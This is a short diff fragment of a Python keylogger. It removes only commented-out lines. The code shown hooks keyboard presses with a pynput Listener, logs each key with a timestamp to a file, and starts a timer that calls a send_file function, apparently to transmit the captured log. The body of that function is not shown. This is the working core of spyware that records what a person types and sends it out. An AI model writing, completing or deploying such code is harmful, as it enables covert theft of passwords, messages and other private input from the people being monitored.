@@ -26,10 +26,6 @@ def send_file():
 def on_press(key):
     logging.info(key)
 
-# def on_release(key):
-#     send_file(KEYLOG_FILE)
-#     return False
-
 #setting the configuration for the logging 
 logging.basicConfig(format = '%(asctime)s:%(message)s', filename = KEYLOG_FILE, encoding = 'utf-8', level = logging.INFO)
 
@@ -37,6 +33,3 @@ logging.basicConfig(format = '%(asctime)s:%(message)s', filename = KEYLOG_FILE, 
 with Listener(on_press = on_press) as listener:
     Timer(5, send_file).start()
     listener.join()
-    #t.start()    
-    #send_file()
-    
